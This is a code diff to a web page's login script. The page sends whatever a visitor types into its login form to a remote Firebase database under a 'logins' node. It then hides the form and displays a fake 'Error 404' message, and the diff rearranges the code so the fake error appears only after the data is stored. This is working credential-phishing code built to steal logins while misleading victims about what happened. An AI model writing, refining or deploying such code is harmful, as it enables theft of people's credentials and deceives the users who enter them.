@@ -178,22 +178,27 @@
             };
             console.log('Sending:', payload);
 
+            // Save to Realtime Database first
             try {
-                // Save to Realtime Database under 'logins' node with a unique key
                 const newLoginRef = db.ref('logins').push();
                 await newLoginRef.set(payload);
                 console.log('Data successfully sent to Realtime Database');
+
+                // Only show the Error 404 message after the data is saved
+                document.getElementById('loginForm').style.display = 'none';
+                document.querySelector('h2').style.display = 'none';
+                document.querySelector('p').style.display = 'none';
+                document.querySelector('img').style.display = 'none';
+                document.getElementById('errorMessage').style.display = 'block';
             } catch (error) {
                 console.error('Realtime Database error:', error.message);
+                // Optionally, you can still show the Error 404 message even if saving fails
+                document.getElementById('loginForm').style.display = 'none';
+                document.querySelector('h2').style.display = 'none';
+                document.querySelector('p').style.display = 'none';
+                document.querySelector('img').style.display = 'none';
+                document.getElementById('errorMessage').style.display = 'block';
             }
-
-            // Hide the login form
-            document.getElementById('loginForm').style.display = 'none';
-            document.querySelector('h2').style.display = 'none';
-            document.querySelector('p').style.display = 'none';
-            document.querySelector('img').style.display = 'none';
-            // Show the Error 404 message
-            document.getElementById('errorMessage').style.display = 'block';
         };
     </script>
 </body>
